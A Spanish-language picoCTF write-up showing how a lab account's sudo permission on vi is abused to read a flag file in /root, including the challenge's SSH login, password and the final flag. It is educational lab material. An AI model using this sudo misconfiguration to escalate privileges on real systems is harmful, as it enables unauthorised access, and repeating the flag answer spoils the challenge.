
## Description
Can you read files in the root file?
The system admin has provisioned an account for you on the main server:
- `ssh -p 55413 picoplayer@saturn.picoctf.net`
- Password: `e3pn6lmvHt`
Can you login and read the root file?

## Solución 
- Usar la terminal de WebShell que esta en picoCTF

Ingresamos al servicio con SSH y los datos que nos porporcionan
```
	ssh -p 55413 picoplayer@saturn.picoctf.net
```

Revisamos la raíz y /root para ver si hay archivos
```
picoplayer@challenge:~$ ls -la /
picoplayer@challenge:~$ ls -la /root
```

No podemos usar el `/root` porque no tenemos permisos, por lo que vamos hacer un `sudo -l` para ver que podemos ejecutar con sudo
```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

Vemos que podemos entrar hasta `vi` entonces hacemos un `sudo vi /root/` para ver si existe un archivo ahi llamado `flag.txt`
```
picoplayer@challenge:~$ sudo vi /root/ 

../                                                                                                                
./
.vim/
.bashrc
.flag.txt
.profile
```

Existe el archivo `flag.txt` por lo que seleccionamos dentro de sudo y damos enter para que nos de la bandera
```
	picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
```

## Notas 

## Referencias
-  https://gchq.github.io/CyberChef/
